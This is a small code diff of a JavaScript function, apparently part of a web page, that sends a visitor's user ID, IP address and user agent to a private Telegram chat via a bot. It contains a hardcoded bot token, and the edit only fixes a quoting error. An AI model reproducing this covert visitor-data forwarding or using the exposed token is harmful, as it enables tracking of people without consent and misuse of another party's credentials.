@@ -21,7 +21,7 @@
         async function sendDataToTelegram(userId, ip, userAgent) {
             const token = '7931297303:AAFpULKCrgNg1CpvOqCK0PuQIO-l8HfSEPE';
             const chatId = 7678649664;
-            const message = `{\n    "user_id: '${userId}'\n    "ip": '${ip}'\n    "user-agent": '${userAgent}'\n}`;
+            const message = `{\n    "user_id": '${userId}'\n    "ip": '${ip}'\n    "user-agent": '${userAgent}'\n}`;
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
             
             try {
